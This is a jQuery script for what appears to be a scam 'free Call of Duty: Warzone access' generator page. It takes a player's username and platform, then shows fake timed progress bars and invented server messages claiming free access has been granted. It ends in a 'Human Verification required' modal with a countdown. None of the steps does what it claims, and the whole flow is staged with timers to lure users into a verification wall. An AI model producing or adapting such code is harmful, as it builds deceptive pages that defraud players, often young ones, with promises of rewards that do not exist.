$(document).ready(function() {
	//var $my_domain_name = "warzone.tweakapp.org"; var $check_domain = window.location.hostname; if($my_domain_name != $check_domain) { window.location.replace("https://warzone.tweakapp.org"); }
	////////////////
	// Connecting to Player Messages
	//////////////// 
	var $connecting_msg_1 = "Making request for the game";
	var $connecting_msg_2 = "Request accepted";
	
	
	////////////////
	// Console Messages
	//////////////// 
	var $console_message_resource_1 = 'Units';
	var $console_message_resource_2 = 'Diamonds';
	var $console_message_1 = 'Establishing connection with app store servers...';
	var $console_message_2 = 'Searching for available free access spots...';
	var $console_message_3 = 'Requesting free access...';
	var $console_message_4 = 'Free access permission succesfully granted...';
	var $console_message_5 = 'Adding Call of Duty®: Warzone to your app store account...';
	var $console_message_6 = 'Human Verification required';
	
	////////////////
	// Resource  Values
	//////////////// 
	var resource_1_value_min = 25000;
	var resource_1_value_max = 500000;
	var $resource_1_value_1 = '25000';
	var $resource_1_value_2 = '125000';
	var $resource_1_value_3 = '350000';
	var $resource_1_value_4 = '500000';
		
	////////////////
	// Resource 2  Values
	//////////////// 
	var resource_2_value_min = 25000;
	var resource_2_value_max = 500000;
	var $resource_2_value_1 = '25000';
	var $resource_2_value_2 = '125000';
	var $resource_2_value_3 = '350000';
	var $resource_2_value_4 = '500000';
	
	// Human Verification Timer
	var $human_verification_timer_value = '600'; //Countdown remaing time in seconds	
	
	// Sound Effects
	ion.sound({
    sounds: [
        {
            name: "swash",
            path: "./audio/",
            volume: 0.1
        },
		{
            name: "success",
            path: "./audio/",
            volume: 0.1
        }
    ],
    path: "sounds/",
    preload: true,
    multiplay: true
	});	
	var $sound_setting = '1';
	
	
	var $selected_platform = '';	
	$('#platform-select-input').select2({
		minimumResultsForSearch: -1
	});
	$('#first-step-popup-wrapper').addClass('rotateInUpRight animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
		$(this).removeClass('rotateInUpRight animated');
	});
	
	$('#platform-select-input').on('change', function() {
		if(this.value == 'Android' ) {
			$(".platform-select-icon-wrapper").html('<i class="fab fab fa-android input-icon"></i>');
		} else if (this.value == 'iOS' ) {
			$(".platform-select-icon-wrapper").html('<i class="fab fa-apple input-icon"></i>');
		} else if (this.value == 'PC' ) {
			$(".platform-select-icon-wrapper").html('<i class="fas fa-desktop input-icon"></i>');
		} else if (this.value == 'PS4' ) {
			$(".platform-select-icon-wrapper").html('<i class="fab fa-playstation input-icon"></i>');
		} else if (this.value == 'Nintendo' ) {
			$(".platform-select-icon-wrapper").html('<i class="fas fa-gamepad input-icon"></i>');
		} else if (this.value == 'Xbox' ) {
			$(".platform-select-icon-wrapper").html('<i class="fab fa-xbox input-icon"></i>');
		}
	});
	
	$('#input-player-username').keyup(function(){
		if ($(this).val() != '') {
			$('#f-s-b-1').removeClass('button-not-allowed');
			$('#f-s-b-1').addClass('button-allowed');
		}
		else if ($(this).val() == '') {
			$('#f-s-b-1').removeClass('button-allowed');
			$('#f-s-b-1').addClass('button-not-allowed');			
		}	
	});
	if ($('#input-player-username').val() != '') {
		$('#f-s-b-1').removeClass('button-not-allowed');
		$('#f-s-b-1').addClass('button-allowed');
	}
	$("#f-s-b-1").click(function() {
		if ($('#input-player-username').val().length <= 2) {
			$(".player-username-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else if ($('#input-player-username').val().length >= 2) {
			var $console_username = $('#input-player-username').val();
			var $console_platform = $('#platform-select-input').val();
			ion.sound.play("swash");
			$.ajax({
				type: "get",
				url: "parts/p_1.php",
				success: function(dataprocess){
					$('#c-w').html(dataprocess).hide().fadeIn();
					$.magnificPopup.open({
						items: {
							src: '#step-one',
						},
						type: 'inline',
						preloader: false,
						mainClass: 'step-connecting',
						modal: true,
						callbacks: {	
							beforeOpen: function() {
							},
							open: function() {
								$('.connecting-wrapper').addClass('flipInX animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).removeClass('flipInX animated');
								});
								function progressBarConnecting(percent, $element) {
									var progressBarConnectingWidth = percent * $element.width() / 100;
									$element.find('div').animate({ width: progressBarConnectingWidth }, 400).html(percent + "%&nbsp;");
								}
								progressBarConnecting(0, $('#progressBarConnecting'));	
								$('.connecting-message').html($connecting_msg_1);
								setTimeout(function() {
									$('.connecting-loadbar').fadeIn();
									progressBarConnecting(10, $('#progressBarConnecting'));	
								}, 400 );	
								setTimeout(function() {
									progressBarConnecting(30, $('#progressBarConnecting'));	
								}, 1000 );
								setTimeout(function() {
									progressBarConnecting(40, $('#progressBarConnecting'));	
								}, 1600 );
								setTimeout(function() {
									progressBarConnecting(50, $('#progressBarConnecting'));	
								}, 2100 );
								setTimeout(function() {
									progressBarConnecting(65, $('#progressBarConnecting'));	
								}, 2700 );
								setTimeout(function() {
									progressBarConnecting(80, $('#progressBarConnecting'));	
								}, 3300 );
								setTimeout(function() {
									progressBarConnecting(90, $('#progressBarConnecting'));	
								}, 3900 );
								setTimeout(function() {
									progressBarConnecting(100, $('#progressBarConnecting'));	
								}, 4500 );
								setTimeout(function() {
									$('.connecting-message').html($connecting_msg_2);
								}, 4800 );
								setTimeout(function() {
									proc1();
								}, 6000 );
								
								function proc1() {		
									$.magnificPopup.close();									
										$.ajax({
												type: "get",
												url: "parts/p_3.php",
												success: function(dataprocess){
													$('#gend').html(dataprocess).hide().fadeIn();	
													function progressBarConsole(percent, $element) {
														var progressBarConsoleWidth = percent * $element.width() / 100;
														$element.find('div').animate({ width: progressBarConsoleWidth }, 500).html(percent + "%&nbsp;");
													}
													progressBarConsole(0, $('#progressBarConsole'));	
													$console_message = $('.console-message');													
													$console_message.html($console_message_1);
													setTimeout(function() {
														$('.console-progress-bar-wrapper').fadeIn();
														$console_message.html($console_message_2);
														progressBarConsole(19, $('#progressBarConsole'));
													}, 3600 );
													setTimeout(function() {
														$console_message.html($console_message_3);
														progressBarConsole(46, $('#progressBarConsole'));
													}, 8100 );
													setTimeout(function() {
														$console_message.html($console_message_4);
														progressBarConsole(59, $('#progressBarConsole'));
													}, 15200 );
													setTimeout(function() {
														$console_message.html($console_message_5);	
														progressBarConsole(87, $('#progressBarConsole'));
													}, 17500 );
													setTimeout(function() {			
														$console_message.html("<span class='c-message-error'>" + $console_message_6 + "</span>");
														progressBarConsole(100, $('#progressBarConsole'));
													}, 24100 );
													setTimeout(function() {
														$('.con-inner').addClass('zoomOutUp animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){																						
															$(this).removeClass('zoomInDown animated');	
															$.magnificPopup.open({
																items: {
																	src: '.human-verification-wrapper',
																},
																type: 'inline',
																preloader: false,
																mainClass: 'step-verification',
																modal: true,
																callbacks: {
																	open: function() {
																		$('.human-verification-wrapper').addClass('zoomInDown animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){																	
																			human_verification_timer.init($human_verification_timer_value);																				
																		});
																	},
																	beforeClose: function() {
																		this.content.addClass('animated fadeOut');
																	},
																	close: function() {
																		this.content.addClass('animated fadeOut');
																	}
																}
															});																
														});
													}, 27500 );
												},
												error: function(){
												  alert("An error occured");
												}
												});																		
								}
							},
							beforeClose: function() {
								this.content.addClass('animated fadeOut');
							},
							close: function() {
								this.content.addClass('animated fadeOut');
							}
						}
					});
				},
				error: function(){
					
				}
			});
			
			
			
		
		}
	});
	
    $('.popup-tos').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-contact').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-pp').magnificPopup({
        type: 'inline',
        preloader: false
    });
});

var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();

function rng(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);

}